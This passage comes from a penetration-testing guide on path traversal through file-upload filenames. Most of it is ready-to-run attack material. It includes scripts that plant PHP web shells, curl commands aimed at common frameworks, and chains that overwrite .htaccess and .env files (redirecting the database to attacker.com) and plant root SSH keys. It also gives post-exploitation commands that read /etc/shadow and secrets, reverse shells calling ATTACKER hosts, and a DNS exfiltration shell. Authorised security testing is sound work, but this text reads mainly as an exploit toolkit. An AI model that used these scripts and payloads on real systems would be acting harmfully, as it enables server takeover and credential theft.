  Content-Disposition: form-data; name="file"; filename="../../../shell.php"
  Content-Type: image/jpeg
  
  
  1e
  <?php system($_GET['cmd']); ?>
  
  7
  --abc--
  0
  
  ```
  :::

  :::tabs-item{label="HTTP/2 Smuggling"}
  ```bash
  # Using h2csmuggler for HTTP/2 cleartext smuggling
  python3 h2csmuggler.py -x https://target.com/upload \
    --header "Content-Type: multipart/form-data; boundary=abc" \
    --data '--abc\r\nContent-Disposition: form-data; name="file"; filename="../../../shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--abc--'
  ```
  :::

  :::tabs-item{label="Request Line Manipulation"}
  ```http
  # Absolute URI
  POST https://target.com/upload HTTP/1.1
  
  # HTTP/0.9 style
  POST /upload
  
  # Path variation
  POST /./upload HTTP/1.1
  POST /upload/. HTTP/1.1
  POST //upload HTTP/1.1
  POST /Upload HTTP/1.1
  POST /UPLOAD HTTP/1.1
  ```
  :::

  :::tabs-item{label="Multipart Padding"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=abc
  
  --abc
  Content-Disposition: form-data; name="file"; filename="safe.jpg"
  Content-Type: image/jpeg
  
  AAAAAAA[5000 bytes of padding]AAAAAAA
  --abc
  Content-Disposition: form-data; name="file"; filename="../../../shell.php"
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  --abc--
  ```
  :::
::

## Automated Exploitation

### Custom Automation Scripts

::tabs
  :::tabs-item{label="Bash - Full Auto"}
  ```bash
  #!/bin/bash
  # path_traversal_upload.sh - Automated path traversal via upload
  
  TARGET="https://target.com"
  UPLOAD_EP="/upload"
  COOKIE="session=YOUR_SESSION"
  SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
  CANARY_CMD="echo+PATH_TRAVERSAL_SUCCESS"
  
  # Generate payloads
  generate_payloads() {
      local depths=(1 2 3 4 5 6 7 8)
      local targets=(
          "var/www/html"
          "srv/www/htdocs"
          "usr/share/nginx/html"
          "opt/lampp/htdocs"
          "home/www/public_html"
      )
      local encodings=("plain" "url" "double_url" "dotdot")
      
      for depth in "${depths[@]}"; do
          for target in "${targets[@]}"; do
              # Plain
              prefix=$(printf '../%.0s' $(seq 1 $depth))
              echo "${prefix}${target}/shell_${depth}.php"
              
              # URL encoded
              prefix_enc=$(printf '..%%2f%.0s' $(seq 1 $depth))
              echo "${prefix_enc}${target}/shell_${depth}_enc.php"
              
              # Double dot bypass
              prefix_bypass=$(printf '....//%.0s' $(seq 1 $depth))
              echo "${prefix_bypass}${target}/shell_${depth}_bypass.php"
          done
      done
  }
  
  # Upload with each payload
  test_traversal() {
      local filename="$1"
      local shell_name=$(basename "$filename")
      
      # Create temp file
      echo "$SHELL_CONTENT" > /tmp/shell_upload.php
      
      # Upload
      response=$(curl -s -o /dev/null -w "%{http_code}" \
          -X POST "${TARGET}${UPLOAD_EP}" \
          -F "file=@/tmp/shell_upload.php;filename=${filename}" \
          -H "Cookie: ${COOKIE}" 2>/dev/null)
      
      echo "[UPLOAD] $filename -> HTTP $response"
      
      # Try to access the shell at web root
      for path in "" "uploads/" "media/" "files/" "static/"; do
          access_code=$(curl -s -o /dev/null -w "%{http_code}" \
              "${TARGET}/${path}${shell_name}?cmd=${CANARY_CMD}" 2>/dev/null)
          
          if [ "$access_code" = "200" ]; then
              result=$(curl -s "${TARGET}/${path}${shell_name}?cmd=${CANARY_CMD}")
              if echo "$result" | grep -q "PATH_TRAVERSAL_SUCCESS"; then
                  echo "[+] SHELL FOUND: ${TARGET}/${path}${shell_name}"
                  echo "[+] Payload: ${filename}"
                  return 0
              fi
          fi
      done
      return 1
  }
  
  echo "[*] Starting path traversal upload attack..."
  generate_payloads | while read payload; do
      test_traversal "$payload" && break
  done
  
  rm -f /tmp/shell_upload.php
  ```
  :::

  :::tabs-item{label="Python - Advanced"}
  ```python
  #!/usr/bin/env python3
  """Path Traversal Upload Exploit Framework"""
  
  import requests
  import sys
  import itertools
  from urllib.parse import quote
  
  class TraversalUploader:
      def __init__(self, target, upload_path, cookie):
          self.target = target.rstrip('/')
          self.upload_path = upload_path
          self.session = requests.Session()
          self.session.headers['Cookie'] = cookie
          self.session.verify = False
          self.shell = '<?php echo "TRAVERSAL_OK";system($_GET["cmd"]); ?>'
          
      def generate_payloads(self, max_depth=8):
          payloads = []
          web_roots = [
              'var/www/html', 'srv/www/htdocs',
              'usr/share/nginx/html', 'opt/lampp/htdocs',
              'home/www/public_html', 'tmp'
          ]
          
          traversal_patterns = [
              '../',                     # Basic
              '..\\',                    # Windows
              '..%2f',                   # URL encoded /
              '..%5c',                   # URL encoded \
              '%2e%2e%2f',               # Full URL encode
              '%2e%2e/',                 # Partial encode
              '..%252f',                 # Double URL encode
              '..%c0%af',               # Overlong UTF-8
              '%c0%ae%c0%ae%c0%af',     # Full overlong
              '..../',                   # Extra dot
              '....\\',                  # Extra dot Windows
              '..;/',                    # Semicolon bypass
              '..\\./',                  # Mixed separators
          ]
          
          for depth in range(1, max_depth + 1):
              for pattern in traversal_patterns:
                  for root in web_roots:
                      prefix = pattern * depth
                      filename = f"{prefix}{root}/shell_{depth}.php"
                      payloads.append(filename)
          
          return payloads
      
      def upload(self, filename, content=None):
          content = content or self.shell
          files = {
              'file': (filename, content, 'image/jpeg')
          }
          try:
              r = self.session.post(
                  f"{self.target}{self.upload_path}",
                  files=files,
                  timeout=10
              )
              return r.status_code, r.text
          except Exception as e:
              return 0, str(e)
      
      def check_shell(self, shell_name):
          check_paths = [
              f"/{shell_name}",
              f"/uploads/{shell_name}",
              f"/media/{shell_name}",
              f"/files/{shell_name}",
              f"/static/{shell_name}",
          ]
          for path in check_paths:
              try:
                  r = self.session.get(
                      f"{self.target}{path}",
                      params={'cmd': 'echo TRAVERSAL_OK'},
                      timeout=5
                  )
                  if 'TRAVERSAL_OK' in r.text:
                      return f"{self.target}{path}"
              except:
                  continue
          return None
      
      def exploit(self):
          payloads = self.generate_payloads()
          print(f"[*] Testing {len(payloads)} traversal payloads...")
          
          for i, payload in enumerate(payloads):
              shell_name = payload.split('/')[-1]
              status, _ = self.upload(payload)
              print(f"[{i+1}/{len(payloads)}] {payload} -> {status}")
              
              shell_url = self.check_shell(shell_name)
              if shell_url:
                  print(f"\n[+] SHELL DEPLOYED: {shell_url}")
                  print(f"[+] Payload used: {payload}")
                  print(f"[+] Usage: {shell_url}?cmd=id")
                  return shell_url
          
          print("[-] No successful traversal found")
          return None
  
  if __name__ == '__main__':
      target = sys.argv[1]      # https://target.com
      upload = sys.argv[2]      # /upload
      cookie = sys.argv[3]      # session=abc123
      
      exploiter = TraversalUploader(target, upload, cookie)
      exploiter.exploit()
  ```
  :::
::

### Tool-Based Exploitation

::tabs
  :::tabs-item{label="Burp Suite Intruder"}
  ```yaml
  # Intruder Configuration for Path Traversal Upload
  # 
  # 1. Capture upload request
  # 2. Send to Intruder
  # 3. Set payload position on filename value
  #
  # Request Template:
  # POST /upload HTTP/1.1
  # Content-Disposition: form-data; name="file"; filename="§PAYLOAD§"
  #
  # Payload Set: traversal-payloads.txt (from earlier section)
  # 
  # Grep Match:
  #   - "uploaded successfully"
  #   - "file saved"
  #   - Status code 200/201
  #
  # Grep Extract:
  #   - file path patterns: /[a-zA-Z0-9_/]+\.(php|aspx|jsp)
  #
  # After finding successful upload, check shell access manually
  ```
  :::

  :::tabs-item{label="Upload Scanner (Burp Extension)"}
  ```yaml
  # Upload Scanner Extension Configuration
  #
  # Install: BApp Store > Upload Scanner
  #
  # Configure:
  # 1. Right-click upload request > "Send to Upload Scanner"
  # 2. Enable checks:
  #    - Path traversal in filename
  #    - Path traversal in Content-Disposition
  #    - Archive-based traversal (Zip Slip)
  #    - Symlink traversal
  # 3. Set payload file: PHP web shell
  # 4. Set monitor URLs for shell access verification
  # 5. Start scan
  ```
  :::

  :::tabs-item{label="ffuf - Filename Fuzzing"}
  ```bash
  # Fuzz the filename parameter for traversal
  # First extract the raw request to a file
  cat > upload_request.txt << 'EOF'
  POST /upload HTTP/1.1
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----boundary
  
  ------boundary
  Content-Disposition: form-data; name="file"; filename="FUZZ"
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ------boundary--
  EOF
  
  # Run ffuf with traversal payloads
  ffuf -request upload_request.txt \
    -request-proto https \
    -w traversal-payloads.txt:FUZZ \
    -mc 200,201 \
    -mr "success|uploaded|saved" \
    -o results.json
  
  # Parse results and check shells
  cat results.json | jq -r '.results[].input.FUZZ' | while read payload; do
    shell=$(basename "$payload")
    for dir in "" uploads/ media/ files/; do
      code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${dir}${shell}?cmd=id")
      [ "$code" = "200" ] && echo "[+] Shell: https://target.com/${dir}${shell}"
    done
  done
  ```
  :::

  :::tabs-item{label="Nuclei Template"}
  ```yaml
  id: path-traversal-upload
  
  info:
    name: Path Traversal via File Upload
    author: pentester
    severity: critical
    tags: upload,traversal,rce
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Content-Type: multipart/form-data; boundary=----TraversalTest
  
          ------TraversalTest
          Content-Disposition: form-data; name="file"; filename="../../../tmp/nuclei_traversal_test.txt"
          Content-Type: text/plain
  
          NUCLEI_TRAVERSAL_CONFIRMED
          ------TraversalTest--
  
        - |
          GET {{BaseURL}}/uploads/../../../tmp/nuclei_traversal_test.txt HTTP/1.1
          Host: {{Hostname}}
  
      matchers:
        - type: word
          words:
            - "NUCLEI_TRAVERSAL_CONFIRMED"
          part: body
  ```
  :::
::

## Framework-Specific Attacks

::card-group
  ::card
  ---
  title: PHP (move_uploaded_file)
  ---
  Exploitable when filename is taken from `$_FILES['file']['name']` and concatenated to a base path without sanitization. `move_uploaded_file()` does **not** prevent traversal in the destination path.
  ::

  ::card
  ---
  title: Node.js (Express/Multer)
  ---
  Multer's `originalname` preserves the client-sent filename. If used directly in `fs.writeFile()` or path construction, traversal is possible. `path.join()` resolves `../` sequences but does not reject them.
  ::

  ::card
  ---
  title: Python (Django/Flask)
  ---
  Django's `UploadedFile.name` contains the original filename. If `os.path.join()` receives an absolute path as the second argument, it discards the base path entirely. Flask's `secure_filename()` strips traversal but must be explicitly called.
  ::

  ::card
  ---
  title: Java (Spring/Servlet)
  ---
  `MultipartFile.getOriginalFilename()` returns the raw client filename. Without `FilenameUtils.getName()` or explicit sanitization, concatenation with base paths is vulnerable.
  ::
::

::tabs
  :::tabs-item{label="PHP"}
  ```bash
  # Test PHP applications
  # move_uploaded_file vulnerability
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=../../../var/www/html/shell.php" \
    -H "Cookie: PHPSESSID=abc123"

  # WordPress - media upload
  curl -X POST https://target.com/wp-admin/async-upload.php \
    -F "async-upload=@shell.php;filename=../../../shell.php" \
    -F "action=upload-attachment" \
    -F "_wpnonce=NONCE" \
    -H "Cookie: wordpress_logged_in_xxx=COOKIE"

  # Laravel - file upload
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.php;filename=../../../../public/shell.php" \
    -H "Cookie: laravel_session=abc" \
    -H "X-CSRF-TOKEN: TOKEN"

  # Drupal - file upload
  curl -X POST "https://target.com/file/ajax/field_image/und/0/form-TOKEN" \
    -F "files[field_image_und_0]=@shell.php;filename=../../../sites/default/files/shell.php" \
    -H "Cookie: SESS123=abc"
  ```
  :::

  :::tabs-item{label="Node.js"}
  ```bash
  # Express + Multer
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.js;filename=../../../app/routes/shell.js" \
    -H "Cookie: connect.sid=abc"

  # Next.js API route
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.js;filename=../../../pages/api/shell.js" \
    -H "Cookie: next-auth.session-token=abc"

  # Overwrite package.json for dependency confusion
  curl -X POST https://target.com/api/upload \
    -F "file=@evil_package.json;filename=../../../package.json" \
    -H "Cookie: connect.sid=abc"

  # Write .env file
  curl -X POST https://target.com/api/upload \
    -F "file=@evil_env;filename=../../../.env" \
    -H "Cookie: connect.sid=abc"
  ```
  :::

  :::tabs-item{label="Python"}
  ```bash
  # Django file upload
  curl -X POST https://target.com/upload/ \
    -F "file=@shell.py;filename=../../../app/views/shell.py" \
    -H "Cookie: sessionid=abc" \
    -H "X-CSRFToken: TOKEN"

  # Flask file upload
  curl -X POST https://target.com/upload \
    -F "file=@shell.py;filename=../../../app/templates/shell.html" \
    -H "Cookie: session=abc"

  # os.path.join() absolute path bypass (Python specific)
  # If os.path.join("/uploads", filename) is used:
  # Sending filename="/var/www/html/shell.php" 
  # os.path.join discards base path when second arg is absolute
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=/var/www/html/shell.php" \
    -H "Cookie: session=abc"

  curl -X POST https://target.com/upload \
    -F "file=@shell.py;filename=/tmp/shell.py" \
    -H "Cookie: session=abc"
  ```
  :::

  :::tabs-item{label="Java"}
  ```bash
  # Spring Boot file upload
  curl -X POST https://target.com/api/upload \
    -F "file=@shell.jsp;filename=../../../webapps/ROOT/shell.jsp" \
    -H "Cookie: JSESSIONID=abc"

  # Apache Tomcat
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;filename=../../../tomcat/webapps/ROOT/shell.jsp" \
    -H "Cookie: JSESSIONID=abc"

  # Struts
  curl -X POST https://target.com/fileUpload.action \
    -F "upload=@shell.jsp;filename=../../../webapps/ROOT/shell.jsp" \
    -H "Cookie: JSESSIONID=abc"

  # WAR file deployment via traversal
  curl -X POST https://target.com/upload \
    -F "file=@shell.war;filename=../../../tomcat/webapps/shell.war" \
    -H "Cookie: JSESSIONID=abc"
  ```
  :::
::

## Advanced Chaining Techniques

### Chain 1 — Traversal + .htaccess Overwrite + Extension Bypass

::steps{level="4"}

#### Upload Malicious .htaccess

```bash
cat > htaccess_payload << 'EOF'
AddType application/x-httpd-php .jpg .png .gif .txt
AddHandler php-script .jpg .png .gif .txt
php_value auto_prepend_file /tmp/shell.php
EOF

curl -X POST https://target.com/upload \
  -F "file=@htaccess_payload;filename=../../.htaccess" \
  -H "Cookie: session=SESS"
```

#### Upload Shell with Safe Extension

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg

curl -X POST https://target.com/upload \
  -F "file=@shell.jpg;filename=shell.jpg" \
  -H "Cookie: session=SESS"
```

#### Execute Shell via JPG Extension

```bash
curl "https://target.com/uploads/shell.jpg?cmd=id"
curl "https://target.com/uploads/shell.jpg?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.jpg?cmd=whoami"
```

::

### Chain 2 — Traversal + Config Overwrite + Credential Theft

::steps{level="4"}

#### Overwrite Application Config

```bash
# Overwrite .env to change database credentials to attacker-controlled DB
cat > evil_env << 'EOF'
DB_HOST=attacker.com
DB_PORT=3306
DB_DATABASE=target_app
DB_USERNAME=root
DB_PASSWORD=toor
APP_DEBUG=true
APP_KEY=base64:attackercontrolledkey1234567890==
EOF

curl -X POST https://target.com/upload \
  -F "file=@evil_env;filename=../../../.env" \
  -H "Cookie: session=SESS"
```

#### Trigger Application Error to Leak Data

```bash
# With APP_DEBUG=true, trigger an error
curl "https://target.com/nonexistent" -v
curl "https://target.com/api/error" -v

# Application now connects to attacker's MySQL
# Set up rogue MySQL server
# https://github.com/Gifts/Rogue-MySql-Server
python rogue_mysql_server.py
```

#### Capture Credentials from Application Connections

```bash
# Monitor attacker MySQL for incoming connections
tail -f /var/log/mysql/rogue.log
```

::

### Chain 3 — Traversal + SSH Key + Full System Access

::steps{level="4"}

#### Generate Attacker SSH Key

```bash
ssh-keygen -t ed25519 -f traversal_key -N "" -C "traversal@pwned"
cat traversal_key.pub
```

#### Upload authorized_keys via Traversal

```bash
# Target root
curl -X POST https://target.com/upload \
  -F "file=@traversal_key.pub;filename=../../../root/.ssh/authorized_keys" \
  -H "Cookie: session=SESS"

# Target web server user
for user in www-data nginx apache http nobody; do
  curl -X POST https://target.com/upload \
    -F "file=@traversal_key.pub;filename=../../../home/${user}/.ssh/authorized_keys" \
    -H "Cookie: session=SESS"
done
```

#### Connect via SSH

```bash
ssh -i traversal_key root@target.com
ssh -i traversal_key www-data@target.com

# If SSH is on non-standard port
ssh -i traversal_key -p 2222 root@target.com
```

#### Escalate Privileges

```bash
# After SSH access
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /var/spool/cron/
```

::

### Chain 4 — Traversal + Log Poisoning + RCE

::steps{level="4"}

#### Upload PHP Shell to Accessible Log Location

```bash
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=../../../var/log/apache2/shell.php" \
  -H "Cookie: session=SESS"

# Or overwrite an existing log file that gets included
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=../../../var/log/app/debug.log" \
  -H "Cookie: session=SESS"
```

#### If Direct Traversal to Web Root Fails — Poison Access Log

```bash
# Inject PHP into User-Agent (access log poisoning)
curl "https://target.com/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Then use traversal to upload a .php file that includes the log
cat > include_log.php << 'EOF'
<?php include('/var/log/apache2/access.log'); ?>
EOF

curl -X POST https://target.com/upload \
  -F "file=@include_log.php;filename=../../../var/www/html/uploads/include_log.php" \
  -H "Cookie: session=SESS"
```

#### Trigger Code Execution

```bash
curl "https://target.com/uploads/include_log.php?cmd=id"
```

::

## Verification & Post-Exploitation

### Confirm Successful Traversal

::code-group
```bash [HTTP Verification]
# Check multiple potential shell locations
SHELLS=("shell.php" "cmd.php" "backdoor.php")
DIRS=("" "uploads/" "media/" "files/" "static/" "assets/" "tmp/")

for shell in "${SHELLS[@]}"; do
  for dir in "${DIRS[@]}"; do
    url="https://target.com/${dir}${shell}"
    code=$(curl -s -o /dev/null -w "%{http_code}" "${url}?cmd=echo+CONFIRMED")
    if [ "$code" = "200" ]; then
      body=$(curl -s "${url}?cmd=echo+CONFIRMED")
      if echo "$body" | grep -q "CONFIRMED"; then
        echo "[+] ACTIVE SHELL: ${url}"
      fi
    fi
  done
done
```

```bash [Out-of-Band Verification]
# If blind traversal — use OOB callbacks
# Payload: <?php file_get_contents("http://BURP_COLLABORATOR/traversal_confirm"); ?>

# Upload shell that calls back
CALLBACK="your-collaborator-id.oastify.com"
echo "<?php file_get_contents('http://${CALLBACK}/confirm'); ?>" > oob_shell.php

curl -X POST https://target.com/upload \
  -F "file=@oob_shell.php;filename=../../../var/www/html/oob.php" \
  -H "Cookie: session=SESS"

# Trigger by requesting the page
curl -s "https://target.com/oob.php" &>/dev/null

# Check Burp Collaborator for DNS/HTTP callback
```

```bash [DNS Exfiltration]
# Shell that exfils hostname via DNS
CALLBACK="your-collaborator.oastify.com"
cat > dns_shell.php << EOF
<?php
\$h = gethostname();
\$u = exec('whoami');
dns_get_record("\$u.\$h.${CALLBACK}", DNS_A);
?>
EOF

curl -X POST https://target.com/upload \
  -F "file=@dns_shell.php;filename=../../../var/www/html/dns.php" \
  -H "Cookie: session=SESS"

curl -s "https://target.com/dns.php" &>/dev/null
# Check DNS logs for: www-data.hostname.your-collaborator.oastify.com
```
::

### Post-Exploitation Commands

::collapsible
**System Enumeration via Deployed Shell**

```bash
# System info
curl "https://target.com/shell.php?cmd=uname+-a"
curl "https://target.com/shell.php?cmd=cat+/etc/os-release"
curl "https://target.com/shell.php?cmd=id"
curl "https://target.com/shell.php?cmd=whoami"
curl "https://target.com/shell.php?cmd=hostname"

# Network
curl "https://target.com/shell.php?cmd=ifconfig" 
curl "https://target.com/shell.php?cmd=ip+addr"
curl "https://target.com/shell.php?cmd=netstat+-tlnp"
curl "https://target.com/shell.php?cmd=ss+-tlnp"
curl "https://target.com/shell.php?cmd=cat+/etc/resolv.conf"

# Users and access
curl "https://target.com/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/shell.php?cmd=cat+/etc/shadow"
curl "https://target.com/shell.php?cmd=sudo+-l"
curl "https://target.com/shell.php?cmd=find+/+\-perm+-4000+-type+f+2>/dev/null"

# Application secrets
curl "https://target.com/shell.php?cmd=find+/var/www+-name+'.env'+-o+-name+'config.php'+-o+-name+'database.yml'+2>/dev/null"
curl "https://target.com/shell.php?cmd=cat+/var/www/html/.env"
curl "https://target.com/shell.php?cmd=cat+/var/www/html/wp-config.php"

# Reverse shell upgrade
curl "https://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```
::

### Reverse Shell Upgrade

::code-group
```bash [Bash]
curl "https://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

```bash [Python]
curl "https://target.com/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

```bash [Perl]
curl "https://target.com/shell.php?cmd=perl+-e+'use+Socket;\$i=\"ATTACKER\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\"%3e%26S\");open(STDOUT,\"%3e%26S\");open(STDERR,\"%3e%26S\");exec(\"/bin/bash+-i\");'"
```

```bash [Netcat]
# Listener on attacker
nc -lvnp 4444

# Trigger from shell
curl "https://target.com/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+ATTACKER+4444+>/tmp/f"
```
::

## Detection Indicators & Cleanup

::tip
During bug bounty engagements, always clean up uploaded shells immediately after confirming the vulnerability. Document the exact payload and steps for reproduction in your report.
::

::collapsible
**Evidence Collection for Reports**

```bash
# Screenshot / capture proof of:
# 1. The upload request with traversal filename (Burp screenshot)
# 2. Server response confirming upload success
# 3. Shell access proving arbitrary write (cmd=id output)
# 4. The exact filename payload used

# Generate clean PoC
echo "PATH_TRAVERSAL_CONFIRMED_BY_RESEARCHER" > poc.txt

curl -v -X POST https://target.com/upload \
  -F "file=@poc.txt;filename=../../../tmp/traversal_poc.txt" \
  -H "Cookie: session=SESS" 2>&1 | tee proof_upload.txt

curl -v "https://target.com/../../../tmp/traversal_poc.txt" 2>&1 | tee proof_access.txt

# Cleanup
curl -X DELETE "https://target.com/api/files/traversal_poc.txt" \
  -H "Cookie: session=SESS"
```
::

## Quick Reference

::field-group
  ::field{name="Primary Payload" type="string"}
  `../../../var/www/html/shell.php` — Basic Linux web root traversal
  ::

  ::field{name="Windows Payload" type="string"}
  `..\..\..\inetpub\wwwroot\shell.aspx` — Basic Windows IIS traversal
  ::

  ::field{name="URL Encoded" type="string"}
  `..%2f..%2f..%2fvar/www/html/shell.php` — Bypass literal `../` filters
  ::

  ::field{name="Double Encoded" type="string"}
  `..%252f..%252f..%252fvar/www/html/shell.php` — Bypass double-decode filters
  ::

  ::field{name="Non-Recursive Strip" type="string"}
  `....//....//....//var/www/html/shell.php` — Bypass single-pass `../` removal
  ::

  ::field{name="Null Byte" type="string"}
  `../../../shell.php%00.jpg` — Truncate extension validation (legacy systems)
  ::

  ::field{name="Python os.path.join" type="string"}
  `/var/www/html/shell.php` — Absolute path discards base directory in Python
  ::

  ::field{name="Zip Slip" type="string"}
  Archive entry named `../../../var/www/html/shell.php` — Extracted outside intended directory
  ::
::

::badge
File Upload — Path Traversal — RCE Chain
::